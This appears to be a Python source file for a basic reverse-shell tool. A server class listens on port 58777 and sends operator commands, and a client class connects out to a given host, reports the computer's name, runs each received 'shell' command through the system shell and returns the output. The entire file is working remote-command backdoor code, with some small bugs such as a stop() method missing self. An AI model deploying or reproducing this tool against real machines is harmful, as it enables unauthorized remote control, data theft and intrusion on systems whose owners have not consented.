import sys, os, os.path
import socket, subprocess, re

class Server:
    
    host = '0.0.0.0'
    port = 58777
    s = None
    max_bind_retries = 10
    conn = None
    addr = None
    hostname = None
    
    def create(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = port

    def bind(self, current_try=0):
        try:
            print("[*] Listening on Port %s (Attempt %d)" % (self.port, current_try))
            self.s.bind((self.host, self.port))
            self.s.listen(1)
        except socket.error as msg:
            print('[-] Socket Binding Error:', msg[0], file=sys.stderr)
            if current_try < self.max_bind_retries: 
                print('Retrying...', file=sys.stderr)
                self.bind(current_try + 1)

    def accept(self):
        try:
            self.conn, self.addr = self.s.accept()
            print('[!] Session Opened at %s:%s' % (self.addr[0], self.addr[1]))
            self.hostname = self.conn.recv(1024)
            self.menu()
        except socket.error as msg:
            print('[-] Socket Accepting Error:', msg[0], file=sys.stderr)

    def menu(self):
        while True:
            cmd = input(str(self.addr[0]) + '@' + str(self.hostname) + '>> ')
            if cmd == 'quit':
                self.conn.close()
                self.s.close()
                return
            command = self.conn.send(cmd)
            result = self.conn.recv(16834)
            if result != self.hostname:
                print(result)

class Client:

    s = None

    def connect(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = int(port)
        try:
            print('[*] Connecting to %s:%s' % (host, port))
            self.s.connect((host, port))
            print('[!] Connection Established')
            self.s.send(os.environ['COMPUTERNAME'])
        except:
            print('[-] Failed to Establish Connection', file=sys.stderr)

    def receive(self):
        received = self.s.recv(1024)
        tokens = re.split('\s+', received, 1)
        command = tokens[0]
        if command == 'quit':
            self.s.close()
        elif command == 'shell':
            if len(tokens) > 1:
                proc2 = subprocess.Popen(tokens[1], shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE)
                output = proc2.stdout.read() + proc2.stderr.read()
                if len(output) == 0:
                    output = '[!] Command Returned Empty Response'
            else:
                output = '[!] Arguments must follow "shell"'
        else:
            output = '[-] Unknow Command. Expecting "quit" or "shell <cmd>" (e.g. "shell dir")'
        self.send(output)

    def send(self, output):
        self.s.send(output)
        self.receive()

    def stop():
        self.s.close()